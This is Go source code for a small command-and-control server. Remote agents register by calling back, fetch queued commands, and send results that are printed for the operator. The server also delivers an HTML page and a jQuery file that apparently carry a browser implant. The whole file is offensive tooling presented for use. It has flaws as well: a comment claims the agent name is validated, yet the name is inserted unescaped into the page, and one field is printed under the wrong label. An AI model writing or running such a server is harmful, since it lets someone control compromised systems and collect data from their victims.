package main
import (
	"github.com/gorilla/mux"
	"net/http"
	"fmt"
	"io/ioutil"
	"log"
	"time"
	"encoding/json"
	"bytes"
)

type Agent struct{
	Name string
	LastCallBack int64
	FirstCallBack int64
}

var Agents = make(map[string]Agent)
var Commands = make(map[string][]string)


func AddAgent(w http.ResponseWriter, r *http.Request){
	var newAgent bool
	vars := mux.Vars(r)
	name := vars["agent"]
	currentTime := time.Now().Unix()
	newAgent = true

	_, exists := Agents[name]
	if exists{
		newAgent = false
		agent := Agents[name]
		agent.LastCallBack = currentTime
		Agents[name] = agent
	}


	if newAgent{
		Agents[name] = Agent{name,currentTime,currentTime}
		fmt.Println(fmt.Sprintf("\n[+] Agent %s is Active [+]",name))
	}

}



func GetCommands(w http.ResponseWriter, r *http.Request){
	vars := mux.Vars(r)
	name := vars["agent"]
	AgentCommands := Commands[name]
	json_data, _ := json.Marshal(AgentCommands)
	// Clears the commands
	Commands[name] = nil
	w.Write(json_data)

}
// To be called internally not from web
func AddCommand(agentName string, command string)  {
	Commands[agentName] = append(Commands[agentName],command)
}


func PrintAgents(){
	if len(Agents) < 1{
		fmt.Println("[-] No Agents are active [-]")
		return
	}
	fmt.Println("\nActive Agents\n")
	for _,agent := range Agents{
		fmt.Println(fmt.Sprintf("Name : %s \t Last Callback: %d \t First Callback: %d",agent.Name,agent.LastCallBack,agent.LastCallBack))
	}
}

func RemoveInactiveAgents(){

	for {
		time.Sleep(5 * time.Second)
		for _, agent := range Agents {
			// Removes the Agent from array if no callback was received last 30 seconds.
			if agent.LastCallBack < (time.Now().Unix() - 30) {
				delete(Agents,agent.Name)
				fmt.Println(fmt.Sprintf("[-] Agent %s is inactive",agent.Name))
			}
		}
	}
}

func GetIndex(w http.ResponseWriter, r *http.Request){

	// Validate the AGENT name to remove attack surface
	vars := mux.Vars(r)
	name := vars["agent"]

	b, err := ioutil.ReadFile("static/index.html")

	index := bytes.Replace(b,[]byte("{AGENT_NAME}"),[]byte(name),1)
	if err != nil {
		log.Fatal(err)
	}
	w.Write(index)
}
func GetJS(w http.ResponseWriter, r *http.Request){

	b, err := ioutil.ReadFile("static/jquery.js")
	if err != nil {
		log.Fatal(err)
	}
	w.Write(b)
}

func PrintData(w http.ResponseWriter, r *http.Request){
	var data []string
	vars := mux.Vars(r)
	name := vars["agent"]
	json_data := r.FormValue("data")
	fmt.Println(fmt.Sprintf("\n[+] Incoming Data from : %s [+]",name))

	// Decode json data
	json.Unmarshal([]byte(json_data),&data)

	for _, d := range data{
		fmt.Println(fmt.Sprintf("\n--------------------RESPONSE-----------------------\n%s",d))
	}
	w.Write([]byte("OK"))
}

func StartHTTPListener(port int)  {

	listener := mux.NewRouter()
	listener.HandleFunc("/main/{agent}",GetIndex).Methods("GET")
	listener.HandleFunc("/jquery.js",GetJS).Methods("GET")
	listener.HandleFunc("/callback/{agent}",AddAgent).Methods("GET")
	listener.HandleFunc("/commands/{agent}",GetCommands).Methods("GET")
	listener.HandleFunc("/data/{agent}",PrintData).Methods("POST")
	server := &http.Server{
		Addr:fmt.Sprintf("127.0.0.1:%d",port),
		Handler:listener,
	}
	server.ListenAndServe()
}
